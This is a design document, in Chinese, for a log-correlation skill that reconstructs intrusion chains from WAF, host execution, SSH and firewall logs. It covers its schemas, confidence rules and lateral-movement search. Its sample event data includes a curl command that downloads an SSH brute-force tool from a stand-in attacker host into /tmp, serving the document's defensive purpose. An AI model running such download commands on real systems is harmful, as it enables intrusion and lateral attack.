**语言：** [English](15-traceability-analysis-skill-design.md) | 简体中文（本文）

# 溯源分析技能设计

> 公开案例与输入输出见[技能示例](../src/skills/traceability-analysis/examples.zh-CN.md)，无需内部产品规划材料。

> SecWeaver 六大核心能力之五  
> 用途：在数据源满足最低要求后，**跨多源日志还原攻击链**，定位初始入口、横向路径与影响范围  
> **当前实现参考（2026-09-16）**：[执行入口](../src/skills/traceability-analysis/scripts/correlate.py)、[分析引擎](../src/skills/traceability-analysis/scripts/traceability_analysis/engine.py)、[用户指南](../docs_user/18-traceability-analysis.zh-CN.md)。历史架构评估只用于理解当时的设计决策。

---

## 一、技能定位

### 1.1 解决什么问题

数据源完整性分析回答「**能不能查**」，溯源分析回答「**查出了什么**」：

| 用户问题 | 溯源 Skill 应给出 |
|---|---|
| 第一个攻破点在哪？ | 初始受害主机、入口 URL/漏洞类型、首次成功时间 |
| 黑客横向到了哪些机器？ | 横向路径列表、跳板关系、登录账号 |
| 攻击链完整吗？ | 分阶段时间线 + 每步证据引用 |
| 影响范围多大？ | 受害主机清单、数据域、建议隔离优先级 |

### 1.2 与其他 Skill 的边界

```text
数据源完整性分析 ──(未 blocked)──▶ 溯源分析 ──▶ 处置建议 / 报告沉淀
        │                              ▲
        │                              │
告警确认 ──(确认真实攻击+成功)──────────┘
        │
风险识别 ──(exec/connect 高危事件)────▶ 可作为溯源线索输入
```

| Skill | 职责 | 不做 |
|---|---|---|
| 数据源完整性分析 | 评估数据够不够 | 不还原攻击链 |
| **溯源分析** | 跨源关联、攻击链、时间线 | 不做误报研判（交给告警确认） |
| 告警确认 | 尝试/真实/误报、是否成功 | 不展开完整横向调查 |
| 对外监听进程命令高危识别 | 单条 exec 分级 | 不做跨主机链式还原 |

### 1.3 前置条件（硬约束）

仅当上游 **数据源完整性分析** 满足以下条件时才应启动本 Skill：

| 条件 | 说明 |
|---|---|
| `next_skill_blocked = false` | P0 数据源齐全 |
| `overall_verdict` ∈ `full_traceable`, `partial_traceable` | 不可在 `not_traceable` 时强行溯源 |
| 用户已选择相关数据资产 | 与完整性评估中的资产一致 |

若用户跳过完整性预检直接要求溯源，Claw **应先补跑** 数据源完整性分析，或明确标注「结论置信度受数据缺口限制」。

---

## 二、适用场景（继承 S1-S8，聚焦「链式还原」）

溯源 Skill 不重复定义场景 taxonomy，**直接复用** 数据源完整性分析的 `S1-S8`，但每个场景的**输出侧重点**不同：

| 场景 | 溯源输出重点 |
|---|---|
| **S1** 外网 IP 溯源 | 入口主机、首次打穿时间、横向清单 |
| **S2** WEB 入侵 | WebShell 路径、利用 URL、落地文件 |
| **S3** 横向移动 | 跳板图、SSH/RDP 登录序列、内网扫描 |
| **S4** | ⚠️ 通常走告警确认；若用户明确要求「查完整攻击链」才进入溯源 |
| **S5** | 从单点 exec 异常扩展为「谁触发、后续连了什么」 |
| **S6** 账号失陷 | 失陷账号、首次异常登录、后续操作 |
| **S7** 数据外传 | 外传路径、打包命令、目标 IP/域名 |
| **S8** C2 通信检测 | C2 回连进程、域名与网络会话路径；不以 DNS 命中单独证明 C2 |

**公开示例主场景**：S1 + S3（外网 IP → WEB 打穿 → SSH 横向）。

---

## 三、输入设计

### 3.1 必填输入

```json
{
  "investigation_intent": "报警时间A，黑客IP为A，查第一个攻破点和横向范围",
  "scenarios": ["S1", "S3"],
  "params": {
    "attacker_ip": "203.0.113.10",
    "time_start": "2026-06-21T08:00:00+08:00",
    "time_end": "2026-06-21T20:00:00+08:00",
    "alert_time": "2026-06-21T10:00:00+08:00",
    "seed_hosts": [],
    "alert_id": null
  },
  "completeness_precheck": {
    "overall_verdict": "partial_traceable",
    "confidence": 0.72,
    "next_skill_blocked": false,
    "data_gaps": ["ssh_auth coverage partial"]
  },
  "evidence_bundles": {
    "waf_alert": [],
    "web_access_log": [],
    "host_exec": [],
    "host_connect": [],
    "host_file_op": [],
    "ssh_auth": [],
    "firewall_log": [],
    "dns_log": [],
    "asset_inventory": []
  }
}
```

### 3.2 字段说明

| 字段 | 说明 |
|---|---|
| `params.attacker_ip` | 锚点：外网攻击源 IP（可多个） |
| `params.alert_time` | 锚点：首次告警或用户关注时间点 |
| `params.time_start/end` | 分析时间窗，默认 `[alert_time-24h, alert_time+6h]` |
| `completeness_precheck` | 上游完整性 Skill 输出摘要，用于置信度封顶 |
| `evidence_bundles` | **已检索到的原始事件**，按 asset_type 分组；Skill 只分析给定证据，不虚构 |

### 3.3 证据事件最小字段（与 audit-port-execmon 对齐）

**host_exec**（audit-port-execmon）：

```json
{
  "event_type": "exec",
  "host": "web-01",
  "timestamp": "2026-06-21T09:15:22+08:00",
  "listener_port": 443,
  "listener_process": "nginx",
  "command": ["curl", "-o", "/tmp/sshscan", "http://evil.example/tool"],
  "cwd": "/var/www/html"
}
```

**host_connect**：

```json
{
  "event_type": "active_connect",
  "host": "web-01",
  "timestamp": "2026-06-21T09:15:20+08:00",
  "dst_ip": "198.51.100.5",
  "dst_port": 80
}
```

**ssh_auth**：

```json
{
  "host": "db-01",
  "timestamp": "2026-06-21T09:22:01+08:00",
  "src_ip": "10.0.1.5",
  "user": "root",
  "result": "Accepted"
}
```

**waf_alert**：

```json
{
  "src_ip": "203.0.113.10",
  "timestamp": "2026-06-21T09:10:05+08:00",
  "url": "/upload/shell.php",
  "payload": "...",
  "action": "blocked"
}
```

---

## 四、输出设计

### 4.1 双通道输出

与数据源完整性 Skill 一致：

1. **结构化 JSON**：供平台报告、图谱、下游处置
2. **Markdown 调查报告**：给安全同学直接阅读

### 4.2 JSON 主结构

以下为[公开合成输入](../examples/traceability/s1-web-shell-to-ssh-lateral.json)的实际输出摘录，已按当前代码复核。它与前面的输入结构示意是不同案例；未列出的证据、上下文和报告字段仍保留在完整输出中。

在仓库根目录完成 `make quickstart` 后复现：

```bash
make ai-showcase CASE=webshell-to-ssh-lateral
```

```json
{
  "alert_type": "traceability_analysis",
  "scenario": [
    "S1",
    "S2",
    "S3"
  ],
  "overall_verdict": "confirmed_intrusion_chain",
  "confidence": 0.88,
  "confidence_ceiling": 0.88,
  "blocked": false
}
```

完整 JSON 位于 `outputs/ai-showcase/webshell-to-ssh-lateral.json`；智能体按 Skill 生成的 Markdown 报告是另一输出。上述数值只适用于固定合成案例。

### 4.3 overall_verdict 枚举

| verdict | 含义 | 条件 |
|---|---|---|
| `confirmed_intrusion_chain` | 完整攻击链，证据充分 | 入口 + 执行 + 横向均有 direct evidence |
| `likely_intrusion_chain` | 高度疑似，个别环节 infer | 部分环节仅有间接证据 |
| `initial_access_only` | 仅确认入口，横向未证实 | 有 WEB 打穿证据，无 SSH 成功 |
| `scanning_or_attempt_only` | 仅扫描/尝试，未打穿 | 仅有 WAF 告警，无 D2 成功证据 |
| `insufficient_evidence` | 证据不足，无法下结论 | 与完整性 blocked 类似但用户强行分析 |

### 4.4 置信度规则

上游预检若阻断，直接生成 blocked 结果；未阻断时，上限按
`float((completeness_precheck or {}).get("confidence") or 1.0)` 读取。缺省或数值 0 当前回退到 1.0，不能用 0 代替 `next_skill_blocked`。

[compute_confidence](../src/skills/traceability-analysis/scripts/traceability_analysis/result.py) 先对阶段 confidence 做算术平均（不是加权平均），缺失阶段值用 `heuristic-rules.json` 的 `policy.confidence_defaults.stage_fallback`。空链使用 `min(empty_chain_cap, ceiling)`。

分析引擎随后按 `confidence_adjustments` 对矩阵 Join 覆盖和 likely lateral 证据加分；每步均用 `min(ceiling, score)` 截断并保留两位小数。阶段 confidence 可以高于总体上限，但最终输出 `confidence` 不得超过 `confidence_ceiling`。具体阈值与加分以规则文件为准。

**硬规则**：

- 无 `host_exec` 成功证据 → 不得 `confirmed_intrusion_chain`
- 无 `ssh_auth` Accepted → 不得断言「横向到 X」为 confirmed，最多 `likely`
- SSH 日志 coverage=partial → `impacted_assets` 必须标注「可能遗漏」

---

## 五、研判流程（Skill 核心算法）

### 5.1 六步流水线

```text
Step 0  门禁：读取 completeness_precheck，blocked 则中止
Step 1  锚点：以 attacker_ip / alert_time 从 D1 拉取首次相关事件
Step 2  入口：判定 initial_access（WEB URL、WebShell、漏洞类型）
Step 3  主机行为：在入口 host 上关联 exec → connect → file_op 时序
Step 4  横向：以入口 host 内网 IP 为 src，查 ssh_auth + firewall 扩散
Step 5  图构建：生成 attack_chain + lateral_movement_graph
Step 6  结论：verdict + 处置建议 + 标注 data_gaps_impact
```

### 5.2 关联规则（Join Keys）

| 步骤 | 关联方式 |
|---|---|
| WAF → exec | `attacker_ip` + `host` + 时间窗 ±15min |
| exec → connect | 同 `host`、同 `pid` 或 ±2min、`curl/wget` 与 dst 对应 |
| exec → file_op | 同 `host`、±5min、`/tmp`、`/var/www` 路径 |
| web host → SSH | `ssh_auth.src_ip` = web host 内网 IP |
| SSH 扩散 | 新受害 host 的 src_ip 成为下一跳 seed，迭代 BFS |
| 防火墙辅助 | 五元组确认 web→内网:22 连接存在 |

### 5.3 横向扩散算法（BFS）

```text
seeds = [initial_access.host]
visited = {}
while seeds not empty:
  h = pop seed
  find ssh_auth where src_ip = ip(h) AND result = Accepted
  find firewall where src_ip = ip(h) AND dst_port = 22
  for each new target host t:
    if t not in visited: add to attack_chain, push t to seeds
stop when: 时间窗结束 / 无新 Accepted / 达到 max_hops=10
```

输出必须区分：

- **confirmed_lateral**：SSH Accepted + 时间连续 + 来源 IP 可解释
- **suspected_lateral**：仅 Failed 过多或 firewall 有连接无 Accepted
- **unknown**：数据覆盖缺口导致

---

## 六、WEB 告警确认示例映射（S1+S3）

### 6.1 事件剧本

```text
203.0.113.10 → WEB WebShell → shell → curl 下载 ssh 暴力破解工具
→ 从 web-01 横向 SSH 至内网多台服务器
```

### 6.2 分阶段证据检查清单

| 阶段 | 期望证据 | 对应数据源 |
|---|---|---|
| 1. 外网攻击 | WAF 告警/访问日志含 attacker_ip | waf_alert, web_access_log |
| 2. WebShell 利用 | 可疑 URL、POST payload | waf_alert |
| 3. 命令执行 | nginx 子进程 bash/curl | host_exec |
| 4. 工具下载 | connect 至外网 80/443 | host_connect |
| 5. 工具落地 | /tmp 下新文件 | host_file_op |
| 6. 内网 SSH 扫描 | 大量 Failed 后 Accepted | ssh_auth |
| 7. 横向路径 | web-01 IP → 内网 :22 | firewall_log |

### 6.3 对话示例输出结构

用户：「报警时间 A，黑客 IP 为 A，分析第一个攻破点和横向攻击事件」

Markdown 应包含：

1. **执行摘要**（3 句话）
2. **初始入口**（主机、时间、URL、证据 ID）
3. **攻击时间线**（表格：时间 | 阶段 | 主机 | 事件 | 证据）
4. **横向移动**（列表或 mermaid 图）
5. **影响范围与处置建议**
6. **数据缺口说明**（若 partial_traceable）
7. **未解答问题**（honest gaps）

---

## 七、MITRE ATT&CK 阶段映射（建议内置）

Skill 每条 attack_chain 节点应标注 `stage` + 可选 `mitre_id`，便于报告与 SOC 对接：

| stage | 典型 SecWeaver 证据 |
|---|---|
| `reconnaissance` | WAF 扫描类告警、大量 404 |
| `initial_access` | WebShell URL、漏洞利用 payload |
| `execution` | host_exec: bash/sh/python |
| `persistence` | host_file_op: crontab、webshell 文件 |
| `command_and_control` | host_connect: 外连 C2 端口 |
| `lateral_movement` | ssh_auth Accepted、内网 connect |
| `collection` | tar/zip 命令 |
| `exfiltration` | 大量外连、proxy 日志 |

**不要求全覆盖**，有证据才写，无证据的阶段放入 `hypotheses` 而非 attack_chain。

---

## 八、与告警确认 Skill 的分工

| 维度 | 告警确认 | 溯源分析 |
|---|---|---|
| 输入 | 单条/批量 WAF 告警 | 多源 evidence_bundles |
| 核心问题 | 误报？真实？成功？ | 入口在哪？横向到哪？ |
| 输出 | verdict: attempt/real/fp | attack_chain + graph |
| 触发 | 「分析这条告警」 | 「查攻击链/横向/攻破点」 |

推荐编排：

```text
仅 WAF 告警 → 告警确认
告警确认 = 真实且成功 → 溯源分析（扩展链）
已知 IP 直接查链 → 完整性分析 → 溯源分析
```

---

## 九、Skill 文件结构

```text
src/skills/traceability-analysis/
├── SKILL.md              # Claw 入口：流程、输入输出、禁止事项
├── heuristic-rules.json    # TigerSec heuristic 阈值（运营可改）
├── rules.md              # 关联规则、阶段判定、verdict 逻辑
├── attack-patterns.json    # 已弃用 stub → 见 risk-identification/rules/chain-patterns.json
├── examples.md           # S1 + S3 完整溯源样例
└── scripts/
    ├── correlate.py       # 薄 CLI 入口和兼容导出
    ├── traceability_analysis/
    │   ├── paths.py       # Skill / catalog / 共享 data-access 路径
    │   ├── common.py      # JSON、时间、主机和 evidence index 辅助
    │   ├── initial_access.py # D1 初始入口和受害主机反查
    │   ├── execution.py   # 主机执行链阶段识别
    │   ├── lateral.py     # SSH 横向识别和 BFS 辅助
    │   ├── result.py      # 门禁、verdict、置信度、blocked 结果、报告 wrapper
    │   ├── engine.py      # analyze() 编排
    │   └── cli.py         # argparse、fetch summary、webhook、输出处理
    ├── correlation_trace.py
    ├── risk_rules_bridge.py   # 加载 chain-patterns + exec-rules 派生
    └── source_adapters/       # TigerSec 等源适配
```

> **2026-07-02 实现说明**：攻击叙事已迁至 `risk-identification/rules/chain-patterns.json`（与 risk 共用），不再在 traceability 下维护独立 patterns 文件。

### 9.1 SKILL.md 应包含的章节

1. YAML frontmatter（name + description 触发词）
2. 前置条件（completeness_precheck 门禁）
3. 输入 schema + evidence_bundles 格式
4. 六步研判流程（不可跳步）
5. 输出 JSON + Markdown 模板
6. verdict / confidence 约束表
7. 禁止事项（无证据不下结论、不得越权 blocked）
8. 与下游处置建议格式

### 9.2 rules.md 应包含的内容

1. 关联 Join 规则表（时间窗、键）
2. BFS 横向扩散伪代码
3. 各 asset_type 事件 → 攻击阶段的映射规则
4. WebShell / curl下载 / SSH 暴力破解 特征模式
5. hypotheses 何时写、与 attack_chain 区别
6. 置信度加减分规则

### 9.3 chain-patterns.json 预设模式（与 risk-identification 共用）

路径：`risk-identification/rules/chain-patterns.json`。溯源经 `risk_rules_bridge.resolve_matched_pattern()` 匹配；阶段指标引用 `exec-rules` / `attck-map` 的 `matched_rule`，**勿**在 traceability 重复 keyword 列表。

示例（节选）：

```json
{
  "id": "web_shell_to_ssh_lateral",
  "label": "WebShell → 下载工具 → SSH 横向",
  "stages": ["initial_access", "execution", "lateral_movement"],
  "required_rules": {
    "initial_access": ["webshell_write"],
    "execution": ["download_and_execute"],
    "lateral_movement": ["LATERAL-SSH-001"]
  }
}
```

旧版 `attack-patterns.json` 的 `indicators{}` 写法已废弃。

---

## 十、禁止事项（Skill 硬约束）

1. **无证据不结论**：attack_chain 每条必须有 `evidence_refs`
2. **不虚构日志**：evidence_bundles 中没有的事件不得写入
3. **尊重 blocked**：`next_skill_blocked=true` 时不得输出 confirmed 结论
4. **区分 confirmed / likely / suspected**：横向移动必须三级标注
5. **标注覆盖缺口**：SSH 不全时不得写「仅横向到 N 台」而不加「至少」
6. **时间线单调**：attack_chain 按 timestamp 排序，冲突时降 confidence
7. **不替代告警确认**：不对单条 WAF 做误报研判（除非用户明确要求且场景含 S4）

---

## 十一、确定性实现边界

| 模块 | 做 | 不做 |
|---|---|
| `correlate.py` | 保持 `python correlate.py ...` 和旧 `import correlate` 兼容 | 承载新增业务逻辑 |
| `traceability_analysis/engine.py` | 编排门禁 → 归一化 → matrix → heuristic → verdict JSON | 低层匹配细节 |
| `traceability_analysis/initial_access.py` | D1 初始入口、exec 推断入口、受害主机反查 | 横向 BFS |
| `traceability_analysis/execution.py` | 主机执行/下载阶段 | 初始 D1 Web 匹配 |
| `traceability_analysis/lateral.py` | exec/auth 推断 SSH 横向与 BFS 图 | 最终 verdict 策略 |
| `traceability_analysis/result.py` | 预检门禁、verdict、置信度、blocked 结果、报告 wrapper | 证据解析 |
| `correlation_trace.py` | Matrix 合同、join→stage 映射、stage merge | heuristic-only BFS |

AI Skill 负责：读骨架 + 证据原文 → 生成 summary、hypotheses、处置建议。

---

## 十二、成功标准（Skill 验收）

以公开的 Web 入侵到 SSH 横向移动示例为例，给定完整 evidence_bundles 时：

- [ ] 正确识别 `web-01` 为 initial_access
- [ ] 时间线含 WebShell → curl → SSH Accepted
- [ ] 列出所有 SSH Accepted 的横向目标
- [ ] 输出 mermaid/图结构可渲染
- [ ] partial SSH 覆盖时标注「可能遗漏」
- [ ] 缺 exec 时 verdict 最高 `scanning_or_attempt_only`

---

## 十三、一句话总结

**溯源分析 Skill = 在数据够用的前提下，用「锚点 IP/时间 → 分阶段关联 → 横向 BFS → 证据链输出」把多源日志还原成安全同学能直接处置的攻击链报告；严格依赖 evidence_refs，置信度受上游完整性分析封顶。**

---

*文档版本：v1.2 | 更新日期：2026-09-16 | 状态：已实现 Skill，并按职责拆分 → `src/skills/traceability-analysis/`*
